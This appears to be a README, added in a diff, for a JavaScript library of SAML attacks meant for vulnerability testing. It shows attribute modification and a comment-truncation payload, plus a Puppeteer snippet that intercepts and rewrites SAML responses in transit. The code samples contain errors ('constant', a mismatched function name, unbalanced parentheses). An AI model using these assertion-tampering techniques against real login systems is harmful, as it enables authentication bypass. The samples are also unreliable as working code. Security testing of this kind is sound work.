@@ -1,0 +1,64 @@
+# lighthouse-saml-utils
+
+Utilities for SAML processing and testing.
+
+## saml-attacks
+
+Common SAML attacks for vulnerability testing.
+
+### Supported Attacks
+
+- [x] Modify
+- [ ] Comment Truncation
+- [ ] XSW 1
+- [ ] XSW 2
+- [ ] XSW 3
+- [ ] XSW 4
+- [ ] XSW 5
+- [ ] XSW 6
+- [ ] XSW 7
+- [ ] XSW 8
+
+### Usage
+
+**Modify Attack**
+
+```js
+const { ModifyAttack } = require("lighthouse-saml-utils");
+
+constant modifiedSaml = await ModifyAttack(xml, 'uid', 'modified')
+```
+
+**Comment Truncation Attack**
+
+```js
+const { ModifyAttack } = require("lighthouse-saml-utils");
+
+constant modifiedSaml = await ModifyAttack(xml, 'uid', 'te<!-- attack -->st')
+```
+
+With puppeteer proxy
+
+```js
+const { CommentTruncationAttack } = require("lighthouse-saml-utils");
+
+page.on("request", async (request) => {
+  if( request.url().includes(target_url) {
+    let post_data = request.postData();
+    let saml_response = post_data.SAMLResponse;
+    modified_saml_response = CommentTruncationAttack(saml_response, "assertion_field", "comment");
+    post_data.SAMLResponse = modified_saml_response;
+
+    await request.continue({
+      method: "POST",
+      postData: qs.stringify(post_data),
+      headers: {
+        ...request.headers(),
+        "Content-Type": "application/x-www-form-urlencoded",
+      }
+    };
+  } else {
+    await request.continue();
+  }
+})
+```
